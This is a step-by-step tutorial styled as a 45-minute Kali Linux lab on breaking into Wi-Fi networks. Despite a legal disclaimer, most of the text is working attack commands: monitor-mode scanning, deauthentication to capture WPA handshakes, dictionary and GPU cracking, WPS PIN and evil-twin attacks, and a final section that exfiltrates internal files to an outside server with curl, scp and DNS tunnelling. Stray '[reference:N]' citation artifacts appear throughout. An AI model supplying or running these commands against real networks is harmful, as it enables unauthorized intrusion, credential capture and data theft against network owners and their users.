# **45‑Minute Kali Linux Wi‑Fi Hacking Lab: From Recon to Exfiltration**

## **⚠️ Legal & Ethical Disclaimer**
> This tutorial is for **educational purposes only**. Conducting wireless penetration testing without explicit written permission from the network owner is illegal in most jurisdictions. Use these techniques only on your own lab networks or in authorized engagements. You are solely responsible for your actions.

---

## **Lab Overview**
- **Duration:** 45 minutes (structured as a guided, hands‑on lab).
- **Prerequisites:**  
  * Kali Linux (latest version) installed.  
  * A wireless adapter that supports **monitor mode** and **packet injection** (e.g., Alfa AWUS036ACH).  
  * Root privileges (`sudo su`).  
  * Basic familiarity with the Linux command line.
- **Objectives:**  
  1. Perform reconnaissance to discover nearby Wi‑Fi networks.  
  2. Capture a WPA/WPA2 handshake by forcing a client to reauthenticate.  
  3. Crack the handshake using dictionary attacks with **aircrack‑ng** and **hashcat**.  
  4. Generate targeted wordlists with **crunch**.  
  5. Briefly explore advanced attacks (WPS, evil‑twin) and data‑exfiltration methods.

---

## **Part 1: Reconnaissance – Finding Your Target (5 min)**
### **Step 1.1 – Enable Monitor Mode**
Monitor mode allows your wireless adapter to capture all packets in the air, not just those addressed to it.

1. **Kill interfering processes** that may block monitor mode:
   ```bash
   sudo airmon-ng check kill
   ```
2. **Start monitor mode** on your wireless interface (commonly `wlan0`):
   ```bash
   sudo airmon-ng start wlan0
   ```
   * This creates a new interface named `wlan0mon` (or similar). Confirm with `iwconfig`[reference:0].

### **Step 1.2 – Scan for Networks**
Use `airodump‑ng` to list all nearby access points and their clients.

```bash
sudo airodump-ng wlan0mon
```

* **Output columns:** BSSID (MAC address), PWR (signal strength), CH (channel), ENC (encryption), ESSID (network name)[reference:1].
* Note the **BSSID**, **channel**, and **ESSID** of your target network (e.g., a test network you own).
* Press **Ctrl+C** to stop the scan.

---

## **Part 2: Capturing the WPA Handshake (10 min)**
### **Step 2.1 – Focus on the Target**
Start `airodump‑ng` again, this time locking onto the target’s channel and BSSID, and saving the capture to a file.

```bash
sudo airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon
```
* Example: `sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon`
* The `-w capture` option saves packets to files named `capture-01.cap`, `capture-01.csv`, etc.

### **Step 2.2 – Force a Handshake with Deauthentication**
To capture the 4‑way handshake, you need a client to (re)authenticate. Use `aireplay‑ng` to send deauthentication packets.

```bash
sudo aireplay-ng -0 5 -a <BSSID> -c <client_MAC> wlan0mon
```
* `-0 5` sends five deauthentication bursts.  
* `-a` is the access‑point BSSID.  
* `-c` is the MAC address of a connected client (seen in the airodump‑ng “STATIONS” list). If omitted, all clients are deauthenticated[reference:2].
* After a few seconds, check the airodump‑ng window. If a handshake is captured, you’ll see **“WPA handshake: <BSSID>”** in the top‑right corner[reference:3].
* Stop airodump‑ng with **Ctrl+C**.

---

## **Part 3: Cracking the Handshake (10 min)**
### **Step 3.1 – Dictionary Attack with Aircrack‑ng**
Use `aircrack‑ng` with a wordlist to crack the handshake.

```bash
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap
```
* `-w` specifies the wordlist (Kali includes `rockyou.txt` in `/usr/share/wordlists/`).  
* If the password is in the wordlist, the key will be displayed[reference:4].

### **Step 3.2 – Faster GPU‑Based Cracking with Hashcat**
If you have a GPU, convert the capture to a hash format that hashcat understands and crack it.

1. **Convert the handshake to hashcat format (hash mode 22000):**
   ```bash
   hcxpcapngtool -o hash.hc22000 capture-01.cap
   ```
2. **Crack with hashcat:**
   ```bash
   hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
   ```
   * Hashcat supports many attack modes (dictionary, brute‑force, rules). See `hashcat --help` for options[reference:5].

---

## **Part 4: Creating Custom Wordlists (5 min)**
### **Step 4.1 – Generate a Targeted Wordlist with Crunch**
`crunch` creates wordlists based on character sets and patterns.

```bash
crunch 8 12 -t @@@%%^^ -o custom_wordlist.txt
```
* `8 12` = minimum length 8, maximum length 12.  
* `-t @@@%%^^` = pattern: three lowercase letters, two digits, two symbols (e.g., `abc12!@`).  
* `-o` saves the output to a file[reference:6].

### **Step 4.2 – Use the Custom Wordlist**
```bash
sudo aircrack-ng -w custom_wordlist.txt capture-01.cap
```
* Or use it with hashcat:
  ```bash
  hashcat -m 22000 hash.hc22000 custom_wordlist.txt
  ```

---

## **Part 5: Advanced Techniques (5 min)**
### **5.1 – WPS Pin Attack**
If the target router has WPS enabled, you can try to recover the PIN (and thus the PSK) with `bully` or `reaver`.

```bash
sudo bully -b <BSSID> -c <channel> wlan0mon
```
* This attack exploits weak WPS implementations. It may take several hours.

### **5.2 – Evil‑Twin (Rogue AP)**
Set up a fake access point with the same SSID as the target, then capture credentials when clients connect.

1. **Create the fake AP:**
   ```bash
   sudo airbase-ng -a <BSSID> --essid "Target_SSID" -c <channel> wlan0mon
   ```
2. **Configure DHCP and routing** (e.g., with `dnsmasq` and `iptables`).
3. **Capture login pages** with tools like `sslstrip` or `bettercap`.

> **Note:** Evil‑twin attacks require additional setup and are beyond the scope of this 45‑minute lab. They are mentioned here as a logical next step.

---

## **Part 6: Data Exfiltration (5 min)**
Once you have the PSK, you can associate with the network and attempt to exfiltrate data.

### **Step 6.1 – Connect to the Network**
Use `wpa_supplicant` or a graphical manager to connect with the cracked password.

```bash
sudo wpa_supplicant -i wlan0 -c <(wpa_passphrase "SSID" "password") &
sudo dhclient wlan0
```

### **Step 6.2 – Exfiltrate Data**
Assume you have found sensitive files on the internal network. Simple exfiltration methods include:

* **HTTP POST** with `curl`:
  ```bash
  curl -F "file=@/path/to/local/file" http://your-server.com/upload
  ```
* **DNS tunneling** (slow but stealthy):
  ```bash
  # On your server, run a DNS server (e.g., dnschef).
  # On the target, use dns2tcp or iodine to tunnel data.
  ```
* **SSH/SCP** (if outbound SSH is allowed):
  ```bash
  scp /path/to/file user@your-server.com:~/exfil/
  ```

> **Reminder:** Exfiltration is only legal on networks you own or have explicit permission to test.

---

## **Part 7: Cleanup & Conclusion (5 min)**
### **Step 7.1 – Restore Your Interface**
Stop monitor mode and restart the network manager.

```bash
sudo airmon-ng stop wlan0mon
sudo systemctl start network-manager
```

### **Step 7.2 – Key Takeaways**
* **Recon:** Monitor mode (`airmon‑ng`) and scanning (`airodump‑ng`) are the foundation of wireless assessment.
* **Handshake Capture:** Deauthentication (`aireplay‑ng`) forces clients to reauthenticate, allowing you to capture the WPA handshake.
* **Cracking:** Dictionary attacks (`aircrack‑ng`, `hashcat`) are effective against weak passwords. Custom wordlists (`crunch`) increase success.
* **Advanced Attacks:** WPS pin attacks and evil‑twin setups are common intermediate/advanced techniques.
* **Exfiltration:** Once on a network, data can be extracted via HTTP, DNS, or SSH.

### **Step 7.3 – Further Learning**
* **Practice:** Set up your own lab with an old router and test devices.
* **Resources:**  
  * [Aircrack‑ng official documentation](https://www.aircrack-ng.org/)  
  * [Hashcat wiki](https://hashcat.net/wiki/)  
  * [Wi‑Fi Security & Penetration Testing – Advanced courses](https://www.offensive-security.com/)

---

